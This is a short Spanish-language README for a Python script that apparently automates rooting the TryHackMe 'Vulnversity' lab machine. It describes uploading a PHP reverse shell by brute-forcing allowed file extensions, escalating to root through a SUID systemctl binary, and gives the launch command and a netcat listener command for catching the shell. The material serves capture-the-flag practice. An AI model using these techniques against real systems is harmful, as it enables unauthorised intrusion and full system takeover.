# VulnUniversity-THM
### Descripcion General:
**Vulnversity_exploit.py** es un script escrito en python, que automatiza la intrusion para la Maquina Vulnversity de la plataforma [Try Hack Me](https://tryhackme.com/room/vulnversity) ganando acceso como root
- Autor:        ErickBuster
- Maquina:	Vulnversity - Try Hack Me
> Sube una reverse shell en php con fuerza bruta cambiando la extension del archivo, 
una vez subido hara una ejecucion remota de comandos aprovechandose de un SUID del servicio systemctl para escalar privilegios como root
### Ejecucion:
```
python3 Vulnversity_exploit.py -r <rhost> -l <lhost>
```
colocarse en escucha en otra terminal con netcat
```
nc -lvnp 443
```
